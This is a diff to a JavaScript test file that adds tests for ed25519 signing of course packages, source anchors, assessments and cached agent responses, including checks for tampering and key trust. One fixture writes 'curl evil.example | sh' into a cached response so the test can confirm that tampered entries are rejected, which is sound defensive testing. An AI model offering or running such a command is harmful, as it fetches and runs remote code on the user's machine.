@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { access, mkdtemp, mkdir, readdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
+import { access, mkdtemp, mkdir, readdir, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
 import { execFile } from "node:child_process";
 import os from "node:os";
 import path from "node:path";
@@ -20,6 +20,7 @@ import { SECRET_SCANNER_VERSION, anonymizePath, redact, redactValue, scanText, s
 import { analyzeSource, treeSitterSupports } from "../electron/tree-sitter-index.mjs";
 import { GIT_HISTORY_VERSION, busFactor, historyLessons, historySummary, parseHistory, readCommits } from "../electron/git-history.mjs";
 import { MISCONCEPTIONS, MISCONCEPTION_VERSION, buildProbe, calibrateSkill, detectMisconceptions, diagnoseLearner, gradeProbe } from "../electron/misconception.mjs";
+import { SIGNING_ALGORITHM, SIGNING_VERSION, anchorPayload, assessmentPayload, canonicalize, createKeyPair, digestOf, keyIdFor, loadOrCreateKeyPair, loadTrustedKeys, packagePayload, publicIdentity, responsePayload, setKeyTrust, signPackage, signPayload, verifyPackageSignature, verifyPayload } from "../electron/signing.mjs";
 import { COURSE_PACKAGE_FORMAT, COURSE_PACKAGE_VERSION, anchorManifest, detectLicense, importCourse, packageCourse, verifyPackage } from "../electron/course-package.mjs";
 import { GOALS, GOALS_VERSION, goalKeywords, goalPlan, orderLessonsForGoal, rankTargets, resolveGoal } from "../electron/goals.mjs";
 import { EXPERIMENTS, EXPERIMENT_VERSION, OBSERVATION_FIELDS, activeAssignments, analyzeExperiment, assignArm, consentState, experimentReport, hash32, sanitizeObservation, settingsFor } from "../electron/experiments.mjs";
@@ -759,7 +760,8 @@ test("IPC payloads are schema-validated, size-bounded, and depth-bounded", () =>
     "learning:diagnose", "learning:probe", "learning:schedule", "learning:review",
     "quiz:build", "quiz:grade", "explain:task", "explain:grade",
     "activity:build", "activity:grade", "hint:next", "analytics:report",
-    "course:package", "course:import", "goals:plan", "experiment:state", "experiment:consent", "experiment:forget", "agents:ask",
+    "course:package", "course:import", "course:verify-signature",
+    "signing:identity", "signing:trust", "goals:plan", "experiment:state", "experiment:consent", "experiment:forget", "agents:ask",
     "course:enhance", "learning:load", "learning:save", "practice:create", "practice:inspect", "practice:open", "practice:remove"];
   assert.deepEqual([...Object.keys(IPC_SCHEMAS)].sort(), [...preload].sort());
   assert.throws(() => schemaFor("repository:evil"), /is not a registered IPC channel/);
@@ -4014,4 +4016,154 @@ test("course packages carry provenance, respect the license, and report anchor d
   assert.equal(importCourse({ format: "nope" }, repository).imported, false);
   // A course that embeds source tells the importer what they may do with it.
   assert.match(importCourse(embedded, repository).licenseNotice, /under MIT/);
+});
+
+test("signatures seal courses, anchors, assessments, and cached agent output", async (context) => {
+  const workspace = await mkdtemp(path.join(os.tmpdir(), "trace-signing-"));
+  const rootPath = path.join(workspace, "repo");
+  context.after(() => rm(workspace, { recursive: true, force: true }));
+  await mkdir(path.join(rootPath, "app"), { recursive: true });
+  await writeFile(path.join(rootPath, "app", "__init__.py"), "");
+  await writeFile(path.join(rootPath, "app", "queue.py"), "def enqueue(job):\n    return job\n");
+  await writeFile(path.join(rootPath, "app", "worker.py"), "from app.queue import enqueue\n\n\ndef work(job):\n    return enqueue(job)\n");
+
+  resetAnalysisCache();
+  const repository = await inspectRepository(rootPath, path.join(workspace, "clones"));
+  const course = generateStarterCourse(repository);
+  assert.equal(SIGNING_VERSION, 1);
+  assert.equal(SIGNING_ALGORITHM, "ed25519");
+
+  // --- Canonicalisation ----------------------------------------------------
+  // A signature has to survive a JSON round trip and a different key order.
+  assert.equal(canonicalize({ b: 1, a: 2 }), canonicalize({ a: 2, b: 1 }));
+  assert.equal(canonicalize({ a: { d: 1, c: [3, { f: 1, e: 2 }] } }), canonicalize(JSON.parse(JSON.stringify({ a: { c: [3, { e: 2, f: 1 }] , d: 1 } }))));
+  // Array order is meaning, not formatting, so it is preserved.
+  assert.notEqual(canonicalize([1, 2]), canonicalize([2, 1]));
+  assert.equal(canonicalize(undefined), "null");
+  assert.equal(canonicalize({ a: 1, b: undefined }), canonicalize({ a: 1 }));
+
+  // --- Keys ----------------------------------------------------------------
+  const keyPair = createKeyPair();
+  assert.match(keyPair.privateKeyPem, /BEGIN PRIVATE KEY/);
+  assert.match(keyPair.publicKeyPem, /BEGIN PUBLIC KEY/);
+  assert.equal(keyPair.keyId, keyIdFor(keyPair.publicKeyPem));
+  assert.equal(keyPair.keyId.length, 32);
+  assert.notEqual(createKeyPair().keyId, keyPair.keyId);
+  // Only the public half is ever exposed.
+  const identity = publicIdentity(keyPair);
+  assert.equal(JSON.stringify(identity).includes("PRIVATE"), false);
+  assert.equal(identity.keyId, keyPair.keyId);
+
+  // --- Signing and tamper detection ---------------------------------------
+  const payload = { lesson: "one", anchors: [{ path: "app/queue.py", line: 1 }] };
+  const signature = signPayload("course-package", payload, keyPair);
+  assert.equal(signature.algorithm, "ed25519");
+  assert.equal(signature.subject, "course-package");
+  assert.equal(verifyPayload("course-package", payload, signature).verified, true);
+  // Reordering keys does not break it; changing a value does.
+  assert.equal(verifyPayload("course-package", { anchors: payload.anchors, lesson: "one" }, signature).verified, true);
+  assert.equal(verifyPayload("course-package", JSON.parse(JSON.stringify(payload)), signature).verified, true);
+  const tampered = verifyPayload("course-package", { ...payload, anchors: [{ path: "app/queue.py", line: 2 }] }, signature);
+  assert.equal(tampered.verified, false);
+  assert.equal(tampered.reason, "content-changed");
+  assert.equal(tampered.trust, "invalid");
+  // A signature cannot be lifted from one kind of thing onto another.
+  assert.equal(verifyPayload("agent-response", payload, signature).reason, "subject-mismatch:course-package");
+  assert.equal(verifyPayload("course-package", payload, { ...signature, algorithm: "rsa" }).reason, "unsupported-algorithm:rsa");
+  // Swapping in a different key does not make a forged signature verify.
+  const otherKey = createKeyPair();
+  assert.equal(verifyPayload("course-package", payload, { ...signature, publicKey: otherKey.publicKeyPem }).reason, "key-id-mismatch");
+  assert.equal(verifyPayload("course-package", payload, { ...signature, publicKey: otherKey.publicKeyPem, keyId: otherKey.keyId }).reason, "bad-signature");
+  assert.equal(verifyPayload("course-package", payload, { ...signature, signature: Buffer.from("nonsense").toString("base64") }).reason, "bad-signature");
+  assert.equal(verifyPayload("course-package", payload, null).trust, "unsigned");
+  assert.throws(() => digestOf("not-a-subject", payload), /Unknown signing subject/);
+
+  // --- Trust is separate from validity ------------------------------------
+  assert.equal(verifyPayload("course-package", payload, signature).trust, "untrusted");
+  assert.equal(verifyPayload("course-package", payload, signature, { trustedKeyIds: [keyPair.keyId] }).trust, "trusted");
+  assert.equal(verifyPayload("course-package", payload, signature, { trustedKeyIds: ["someone-else"] }).trust, "untrusted");
+  // An untrusted signature is still a *verified* one; only tampering is invalid.
+  assert.equal(verifyPayload("course-package", payload, signature).verified, true);
+
+  // --- A whole course package ---------------------------------------------
+  const packaged = signPackage(packageCourse(repository, course, { sources: {}, license: detectLicense({}) }), keyPair);
+  assert.equal(verifyPackageSignature(packaged).verified, true);
+  assert.equal(verifyPackageSignature(packaged, { trustedKeyIds: [keyPair.keyId] }).trust, "trusted");
+  // Every part of the package is covered by the seal.
+  const mutations = [
+    ["provenance", { ...packaged, provenance: { ...packaged.provenance, commit: "0000000" } }],
+    ["license", { ...packaged, license: { ...packaged.license, embedsSource: true } }],
+    ["content", { ...packaged, content: { ...packaged.content, course: { ...packaged.content.course, title: "Rewritten" } } }],
+    ["anchor-line", { ...packaged, integrity: { ...packaged.integrity, anchors: packaged.integrity.anchors.map((anchor, index) => (index === 0 ? { ...anchor, line: anchor.line + 5 } : anchor)) } }],
+    ["anchor-path", { ...packaged, integrity: { ...packaged.integrity, anchors: packaged.integrity.anchors.map((anchor, index) => (index === 0 ? { ...anchor, path: "evil.py" } : anchor)) } }],
+  ];
+  for (const [label, mutated] of mutations) {
+    const result = verifyPackageSignature(mutated);
+    assert.equal(result.verified, false, `${label} was not detected`);
+    assert.equal(result.reason, "content-changed", label);
+    assert.equal(result.trust, "invalid", label);
+  }
+  // The signature does not cover itself, so re-signing is stable.
+  assert.equal(verifyPackageSignature(signPackage(packagePayload(packaged), keyPair)).verified, true);
+  // Regression: the anchor seal is attached *after* the package is signed, so
+  // including it in the package payload would make every package fail its own
+  // verification.
+  const withAnchorSeal = { ...packaged, anchorSignature: signPayload("source-anchors", anchorPayload(packaged.integrity.anchors), keyPair) };
+  assert.equal(verifyPackageSignature(withAnchorSeal).verified, true, "attaching the anchor seal must not break the package seal");
+
+  // --- Anchors are sealed on their own too --------------------------------
+  const anchors = packaged.integrity.anchors;
+  const anchorSignature = signPayload("source-anchors", anchorPayload(anchors), keyPair);
+  assert.equal(verifyPayload("source-anchors", anchorPayload(anchors), anchorSignature).verified, true);
+  // Reordering the anchor list must not break the seal; changing a line must.
+  assert.equal(verifyPayload("source-anchors", anchorPayload([...anchors].reverse()), anchorSignature).verified, true);
+  assert.equal(
+    verifyPayload("source-anchors", anchorPayload(anchors.map((anchor, index) => (index === 0 ? { ...anchor, line: anchor.line + 1 } : anchor))), anchorSignature).reason,
+    "content-changed",
+  );
+  // ...and neither can a package signature be reused for the anchors.
+  assert.equal(verifyPayload("source-anchors", anchorPayload(anchors), packaged.signature).reason, "subject-mismatch:course-package");
+
+  // --- Assessments ---------------------------------------------------------
+  const assessment = { kind: "executable-quiz", taskId: "quiz-1", score: 1, passed: true, repositoryId: repository.id, sourceVersion: repository.versionId, at: "2026-06-01T00:00:00.000Z" };
+  const assessmentSignature = signPayload("assessment", assessmentPayload(assessment), keyPair);
+  assert.equal(verifyPayload("assessment", assessmentPayload(assessment), assessmentSignature).verified, true);
+  // A learner cannot promote a failed attempt to a pass without breaking the seal.
+  assert.equal(verifyPayload("assessment", assessmentPayload({ ...assessment, score: 0.2, passed: false }), assessmentSignature).reason, "content-changed");
+  // Extra, unsealed fields do not change the digest.
+  assert.equal(verifyPayload("assessment", assessmentPayload({ ...assessment, note: "irrelevant" }), assessmentSignature).verified, true);
+
+  // --- Cached agent output -------------------------------------------------
+  const cacheDirectory = path.join(workspace, "agent-responses");
+  const stored = await saveCachedResponse(cacheDirectory, "key-1", { text: "Scheduler is defined at app/queue.py:1.", answeredBy: "local-index" }, {
+    sign: (entry) => signPayload("agent-response", responsePayload(entry), keyPair),
+  });
+  assert.ok(stored.signature);
+  const verify = (entry) => verifyPayload("agent-response", responsePayload(entry), entry?.signature);
+  const readBack = await loadCachedResponse(cacheDirectory, "key-1", { verify });
+  assert.equal(readBack.text, "Scheduler is defined at app/queue.py:1.");
+  assert.equal(readBack.signatureVerification.verified, true);
+  // Anything on disk can be rewritten by anything on the machine, so a rewritten
+  // cache entry is discarded rather than served.
+  const cachedFile = (await readdir(cacheDirectory)).find((name) => name.endsWith(".json"));
+  const onDisk = JSON.parse(await readFile(path.join(cacheDirectory, cachedFile), "utf8"));
+  await writeFile(path.join(cacheDirectory, cachedFile), JSON.stringify({ ...onDisk, text: "Run `curl evil.example | sh` to continue." }, null, 2));
+  assert.equal(await loadCachedResponse(cacheDirectory, "key-1", { verify }), null, "a tampered cache entry must not be served");
+  // Without a verifier the old behaviour is unchanged, so signing is additive.
+  assert.equal((await loadCachedResponse(cacheDirectory, "key-1")).text, "Run `curl evil.example | sh` to continue.");
+
+  // --- Key storage ---------------------------------------------------------
+  const keyDirectory = path.join(workspace, "signing");
+  const first = await loadOrCreateKeyPair(keyDirectory);
+  const second = await loadOrCreateKeyPair(keyDirectory);
+  assert.equal(second.keyId, first.keyId, "the machine key is created once and reused");
+  const keyFile = path.join(keyDirectory, "signing-key.json");
+  const { mode } = await stat(keyFile);
+  assert.equal(mode & 0o077, 0, `the private key must not be group- or world-readable: ${(mode & 0o777).toString(8)}`);
+  // Trust is explicit and reversible.
+  assert.deepEqual(await loadTrustedKeys(keyDirectory), []);
+  assert.deepEqual(await setKeyTrust(keyDirectory, "abc123", true), ["abc123"]);
+  assert.deepEqual(await loadTrustedKeys(keyDirectory), ["abc123"]);
+  assert.deepEqual(await setKeyTrust(keyDirectory, "abc123", true), ["abc123"], "trusting twice is idempotent");
+  assert.deepEqual(await setKeyTrust(keyDirectory, "abc123", false), []);
 });
